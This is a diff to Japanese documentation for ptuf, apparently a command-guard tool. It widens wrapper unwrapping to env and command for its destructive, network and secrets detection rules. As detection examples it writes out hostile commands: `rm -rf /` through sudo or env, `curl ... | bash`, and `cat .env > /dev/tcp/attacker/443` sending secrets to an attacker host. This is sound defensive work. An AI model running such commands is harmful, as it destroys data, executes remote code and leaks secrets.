@@ -26,10 +26,12 @@ ptuf は built-in pack を持つ。pack は config の `packs.<name>.enabled` �
 スラッシュを畳み込み (`//etc` → `/etc`)、末尾 `/` を除去する。`..` を含む
 ターゲットは shell 展開前に解決先が読めないため悲観的に destructive 扱いとする
 (glob 展開前の `/e*` 形は本イテレーション範囲外)。`sudo rm -rf /` や
-`doas -u root rm -rf /etc` のような権限昇格ラッパー (`sudo` / `doas` / `pkexec` /
-`run0`) 経由も `unwrap_privilege_wrapper` で剥がして評価し (value-taking option
-も skip する)、`su -c '...'` の内側コードは再 parse して `inner_argv` 経由で
-同じ rule に流す。
+`doas -u root rm -rf /etc`、`env rm -rf /`、`command rm -rf /` のような
+プレフィックスラッパー (権限昇格系 `sudo` / `doas` / `pkexec` / `run0`、および
+POSIX コマンドラッパー `env` / `command`) 経由も `unwrap_prefix_wrapper` で
+剥がして評価し (value-taking option も skip する。`env FOO=bar rm ...` の
+inline `KEY=VALUE` 代入も跨ぐ)、`su -c '...'` の内側コードは再 parse して
+`inner_argv` 経由で同じ rule に流す。
 
 ## `core.network`
 
@@ -42,9 +44,12 @@ ptuf は built-in pack を持つ。pack は config の `packs.<name>.enabled` �
 - `curl ... | bash`
 - `wget -qO- ... | sh`
 
-`... | sudo bash` や `... | doas -u root bash` のような権限昇格ラッパー経由の
-interpreter も `unwrap_privilege_wrapper` で剥がして判定する (value-taking
-option も skip する)。
+`... | sudo bash` や `... | doas -u root bash`、`... | env bash`、
+`env curl ... | sh` のようなプレフィックスラッパー (`sudo` / `doas` / `pkexec` /
+`run0` / `env` / `command`) 経由の fetcher / interpreter も `unwrap_prefix_wrapper`
+で剥がして判定する (value-taking option も skip する)。fetcher / interpreter の
+head は `head_basename` で basename 化するため `/usr/bin/curl ... | /bin/bash` の
+ようなフルパス head も拾う。
 
 ## `core.secrets`
 
@@ -80,8 +85,8 @@ shape では発火しない。一方 pipeline 内の redirect (`curl https://x >
 など) は同一 pipeline として扱う。bash の `/dev/tcp/host/port` や
 `/dev/udp/host/port` への書き込み redirect (`>`, `>>`, `2>`, `&>`) も network
 sink とみなす (`cat .env > /dev/tcp/attacker/443` 等)。network sink が `sudo` /
-`doas` などの権限昇格ラッパー経由で起動される場合も `unwrap_privilege_wrapper`
-で剥がして判定する。
+`doas` などの権限昇格ラッパーや `env` / `command` などの POSIX コマンドラッパー
+経由で起動される場合も `unwrap_prefix_wrapper` で剥がして判定する。
 `$(...)` を含む command は parser から body
 が見えないため、従来どおり command-wide co-occurrence で pessimistic に判定
 する (false positive を選ぶ既存方針)。`sensitive-bash-read` も同じ
